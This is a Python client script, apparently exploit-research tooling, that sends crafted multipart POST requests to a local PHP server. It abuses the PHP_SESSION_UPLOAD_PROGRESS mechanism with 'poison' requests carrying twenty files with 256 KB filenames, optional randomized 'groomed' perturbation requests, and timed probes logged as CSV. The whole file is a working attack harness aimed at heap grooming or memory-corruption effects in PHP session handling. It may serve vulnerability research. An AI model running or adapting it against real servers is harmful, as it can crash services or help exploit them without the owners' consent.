#!/usr/bin/env python3
"""Stage-1 campaign client (min_freq=0 config).
Phases on ONE worker:
  A: 3 clean probe requests (baseline, no poison)
  B: N cycles of poison_i [+ 2 perturb_i (groomed)] + probe_i
Logs seq,tag,sid,http,latency,body_bytes CSV lines to stdout.
"""
import http.client, random, sys, time

HOST = "127.0.0.1"

def part(name, value, fname=None):
    b = "--BOUNDARYX\r\nContent-Disposition: form-data; name=\"%s\"" % name
    if fname is not None:
        b += "; filename=\"%s\"" % fname
    b += "\r\n\r\n"
    return b.encode() + value + b"\r\n"

END = b"--BOUNDARYX--\r\n"

def poison_body(sid, key, nfiles=20):
    b = part("PHPSESSID", sid.encode()) + part("PHP_SESSION_UPLOAD_PROGRESS", key.encode())
    for i in range(nfiles):
        b += part("p%d" % i, b"X", "A" * 262144)
    return b + END

def probe_body(sid, key):
    return (part("PHPSESSID", sid.encode()) +
            part("PHP_SESSION_UPLOAD_PROGRESS", key.encode()) +
            part("u0", b"DATA", "small.txt") + END)

def perturb_body(rng, sid, tag):
    b = part("PHPSESSID", sid.encode()) + part("PHP_SESSION_UPLOAD_PROGRESS", tag.encode())
    for i in range(rng.randint(1, 3)):
        flen = rng.choice([4096, 16384, 65536])
        clen = rng.choice([1024, 65536])
        b += part("g%d" % i, rng.randbytes(clen), "G" * flen)
    return b + END

def post(port, body, timeout=90):
    c = http.client.HTTPConnection(HOST, port, timeout=timeout)
    t0 = time.perf_counter()
    c.request("POST", "/", body, {
        "Content-Type": "multipart/form-data; boundary=BOUNDARYX",
        "Content-Length": str(len(body))})
    r = c.getresponse()
    r.read()
    st = r.status
    c.close()
    return st, time.perf_counter() - t0

def main():
    port, mode, ncyc, seed = int(sys.argv[1]), sys.argv[2], int(sys.argv[3]), int(sys.argv[4])
    rng = random.Random(seed)
    seq = 0
    print("seq,tag,sid,http,latency_s,body_bytes", flush=True)
    def do(tag, sid, body):
        nonlocal seq
        try:
            st, dt = post(port, body)
        except Exception:
            st, dt = -1, -1.0
        print("%d,%s,%s,%s,%.4f,%d" % (seq, tag, sid, st, dt, len(body)), flush=True)
        seq += 1
    for k in range(3):
        do("cleanprobe", "ca%03d" % k, probe_body("ca%03d" % k, "ck%d" % k))
    for i in range(ncyc):
        do("poison", "pz%03d" % i, poison_body("pz%03d" % i, "zk%d" % i))
        if mode == "groomed":
            for j in range(2):
                do("perturb", "pt%03d_%d" % (i, j), perturb_body(rng, "pt%03d_%d" % (i, j), "t%d_%d" % (i, j)))
        do("probe", "pr%03d" % i, probe_body("pr%03d" % i, "rb%d" % i))

if __name__ == "__main__":
    main()
